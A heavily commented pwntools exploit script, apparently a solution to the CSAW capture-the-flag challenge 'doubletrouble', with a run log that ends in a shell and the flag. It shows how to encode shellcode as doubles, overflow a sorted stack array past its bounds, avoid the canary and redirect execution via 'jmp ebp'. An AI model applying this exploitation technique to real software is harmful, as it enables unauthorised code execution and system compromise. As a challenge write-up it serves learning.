#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch="i386", os="linux")

binary = ELF("./doubletrouble")

if not args["REMOTE"]:
    argv = [binary.path]
    envp = {"PWD": os.getcwd()}

    if args["GDB"]:
        io = gdb.debug(
            args=argv,
            env=envp,
            aslr=False,
            terminal=["tmux", "new-window"],
            gdbscript="""\
                set breakpoint pending on
                set follow-fork-mode parent

                s $numbers=0xffffdbc8
                # b *0x8049733
                b *0x804977D

                continue
            """,
        )
    else:
        io = process(argv=argv, env=envp)
else:
    io = remote("pwn.chal.csaw.io", 9002)

# by integeruser

# basically, `doubletrouble` reads (at most 64) strings from the user, converts each of them
# to a double using `atof()`, and stores the resulting qwords into an array on the stack; then,
# this array of doubles is sorted, and the result is printed on screen

# because of a "vulnerability", we can increase the value of the variable containing the size of the array,
# so that `sortArray()` operates out of bounds and moves around also qwords that do not belong to the array
# but are next to it (at higher addresses) on the stack

# the challenge is to give to the program carefully chosen numbers so that, after the execution
# of `sortArray()`, the return address will contain a value of our choice, and also
# without disrupting the stack canary

# the stack is executable, so we can store a shellcode in the array of doubles


def to_decimal(d):
    # translate the double number `d` (encoded in 8 bytes as per IEEE 754)
    # into its decimal representation with sufficient precision
    return "%.90e" % struct.unpack("<d", d)[0]


# read the address of the buffer on the stack that will store our numbers
buf_addr = int(io.readline(), 16)
io.success("buf_addr: %#x" % buf_addr)

# create a list of the 64 numbers to send, initialising all entries to any number that
# after `sortArray()` will stay for sure below the stack canary (at lower addresses) (for simplicity)
numbers = [str(-sys.float_info.max)] * 64

# encode the first part of our shellcode (must be 8 bytes long, i.e. the size of a double)
# 0x0804a12d is the address of the string `sh\0`; `push eax` is a single-byte instruction for pushing
# any value on the stack; the relative jump is for moving to the second part of the shellcode (that
# after `sortArray()` moves around the stack)
numbers[0] = to_decimal(asm("push 0x0804a12d; push eax; jmp $-0x16"))
# encode the second part of our shellcode (must be 8 bytes long, i.e. the size of a double)
# 0x0804bff0 contains the address of `system()`; `stc` (never executed) is any instruction (found by trial and error)
# whose encoding allows this double to not interfere with the stack canary and the return address
numbers[1] = to_decimal(asm("nop; jmp dword ptr [0x0804bff0]; stc"))

# (side note: I first exploited the service by storing (much more easily and without any constraint)
# the shellcode in the heap, by exploiting the facts that: the heap was executable too; each input string
# read by the program was saved to a buffer malloc'ed in the heap before being converted to double and
# stored in the stack; there is a stack variable which contains the address of the last malloc'ed buffer
# but, for whatever reason, this exploit did not work in remote (despite working on two different local machines):
# maybe the heap was not executable there, for whatever reason)

# now, encode the new value for the return address
# doubles are problematic when starting with 0xfff... because in this case they represent either `-inf` or `Nan`
# so, we cannot directly set the return address to the address of the shellcode (because it will be encoded as
# a double starting with 0xfff...); instead, we set `ebp` to the address of the shellcode and then return to `jmp ebp`
ret_addr = 0x80497b8  # .text:080497B8                 jmp     ebp
shellcode_addr = buf_addr + 0x1f0
ebp = shellcode_addr
numbers[2] = to_decimal(p64((ret_addr << 32) | ebp))

# exploit the "vulnerability": send any value between -100.0 and -10.0 at index 4 to increase the array size,
# so that `sortArray()` can reach and modify also the `ebp` and the return address on the stack
numbers[4] = "-99.0"

# now, send all numbers...
assert len(numbers) == 64
io.sendlineafter("How long: ", str(len(numbers)))
for num in numbers:
    assert len(num) < 100
    io.sendline(num)

# ...and get the shell (if the stack canary has not been moved around by `sortArray()`; otherwise,
# `*** stack smashing detected ***` happens and we need to try the exploit again)
io.interactive()
# $ ./doubletrouble.py REMOTE
# [*] '/home/vagrant/vbox/doubletrouble/doubletrouble'
#     Arch:     i386-32-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX disabled
#     PIE:      No PIE (0x8048000)
#     RWX:      Has RWX segments
# [+] Opening connection to pwn.chal.csaw.io on port 9002: Done
# [+] buf_addr: 0xffd11098
# [*] Switching to interactive mode
# 64
# Give me: 4.872429020422124170868240124275848358572836234862504783976249288884787868337798090415467367e-270
# -1.79769313486e+308
# 4.872432633396132314279486783381742503782627220381000326836837689031563351606624267124679855e-270
# -7.499825038984946939628250664793118106823794881378323028207778011740019541684075238721729092e+158
# -1.79769313486e+308
# -99.0
# -1.039472278572411376947109242279359270480916401490303837390095046408652370798689586905581016e+275
# -1.79769313486e+308
# -1.79769313486e+308
# -1.79769313486e+308
# . . .
# 64:-3.947205e-23
# 65:2.120476e-314
# 66:4.872429e-270
# 67:4.872433e-270
# 68:4.872934e-270
# sh: 0: can't access tty; job control turned off
# $ $ ls
# ls
# doubletrouble  flag.txt
# $ $ cat flag.txt
# cat flag.txt
# flag{4_d0ub1e_d0ub1e_3ntr3ndr3}
